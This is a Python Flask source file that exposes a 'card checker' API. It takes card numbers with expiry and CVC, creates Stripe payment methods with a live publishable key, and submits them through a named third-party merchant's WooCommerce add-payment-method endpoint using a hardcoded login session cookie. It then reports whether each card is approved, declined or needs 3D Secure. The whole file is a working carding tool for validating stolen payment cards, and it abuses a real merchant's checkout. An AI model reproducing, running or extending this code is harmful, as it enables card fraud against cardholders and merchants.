from flask import Flask, request, jsonify
import requests
import json

app = Flask(__name__)

API_KEY = "yashikaaa"

def simplify_response(response_data):
    """Simplify the Stripe response to a more concise format"""
    if 'error' in response_data:
        return response_data['error'].get('message', 'Declined')
    
    if isinstance(response_data, dict):
        if response_data.get('success') and 'data' in response_data:
            status = response_data['data'].get('status', '').lower()
            if status == 'succeeded':
                return "Approved"
            elif status == 'requires_action':
                return "3D Secure Required"
            else:
                return "Declined"
        elif 'error' in response_data:
            return response_data['error']
    
    return "Declined"

def process_card(ccx):
    # Parse card details
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) < 4:
        return {"error": "Invalid card format. Use: NUMBER|MM|YY|CVC"}, "invalid_format"
    
    n = parts[0].strip()
    mm = parts[1].strip()
    yy = parts[2].strip()
    cvc = parts[3].strip()
    
    if len(yy) == 4:
        yy = yy[2:]
    
    if not (len(n) >= 13 and len(n) <= 19 and n.isdigit()):
        return {"error": "Invalid card number"}, "invalid_card"
    
    if not (len(mm) == 2 and mm.isdigit() and 1 <= int(mm) <= 12):
        return {"error": "Invalid expiration month"}, "invalid_month"
    
    if not (len(yy) == 2 and yy.isdigit()):
        return {"error": "Invalid expiration year"}, "invalid_year"
    
    if not (len(cvc) >= 3 and len(cvc) <= 4 and cvc.isdigit()):
        return {"error": "Invalid CVC"}, "invalid_cvc"

    # Step 1: Create payment method with Stripe
    stripe_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'billing_details[address][country]': 'IN',
        'payment_user_agent': 'stripe.js/4914722127; stripe-js-v3/4914722127',
        'key': 'pk_live_51PHFfEJakExu3YjjB9200dwvfPYV3nPS2INa1tXXtAbXzIl5ArrydXgPbd8vuOhNzCrq6TrNDL2nFGyZKD23gwQV00AS39rQEH',
    }

    stripe_headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    try:
        stripe_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data,
            timeout=10
        )
        stripe_json = stripe_response.json()
        
        if 'id' not in stripe_json:
            error_msg = stripe_json.get('error', {}).get('message', 'Stripe API Error')
            return {"error": error_msg}, "stripe_error"
            
        payment_id = stripe_json['id']
    except Exception as e:
        return {"error": f"Stripe connection error: {str(e)}"}, "stripe_error"

    # Step 2: Get nonce from merchant site
    cookies = {
        'wordpress_logged_in_91ca41e7d59f3a1afa890c4675c6caa7': 'Yash-aka-ika-tika-pikachuueee|1749821420|qfHJ34OcIzT4oRzRiTn3M3MCm1WsFCTBWgGUjEIyQ2I|ab2600c871256a3fef2c768b1a03636ce15ad69691dea1a9b6ea7a533d8ed574',
    }

    headers = {
        'authority': 'hakfabrications.com',
        'accept': '*/*',
        'referer': 'https://hakfabrications.com/my-account/add-payment-method/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    try:
        page_response = requests.get(
            'https://hakfabrications.com/my-account/add-payment-method/',
            cookies=cookies,
            headers=headers,
            timeout=10
        )
        
        if page_response.status_code != 200:
            return {"error": "Failed to load payment page"}, "page_load_error"
            
        try:
            nonce = page_response.text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
        except:
            return {"error": "Could not extract nonce from page"}, "nonce_error"
    except Exception as e:
        return {"error": f"Failed to get nonce: {str(e)}"}, "nonce_error"

    # Step 3: Create and confirm setup intent
    params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
    data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': payment_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }

    try:
        final_response = requests.post(
            'https://hakfabrications.com/',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=10
        )
        
        try:
            response_json = final_response.json()
            simplified = simplify_response(response_json)
            return {"result": simplified}, "success"
        except json.JSONDecodeError:
            return {"error": "Payment gateway error"}, "gate_error"
    except Exception as e:
        return {"error": f"Final request failed: {str(e)}"}, "request_error"

@app.route('/key=<key>/cc=<cc>', methods=['GET'])
def api_process_card(key, cc):
    if key != API_KEY:
        return jsonify({
            "card": cc,
            "response": "Invalid API key",
            "status": "unauthorized"
        }), 401
    
    response, status = process_card(cc)
    
    return jsonify({
        "card": cc,
        "response": response.get("result") or response.get("error", "Unknown error"),
        "status": status
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
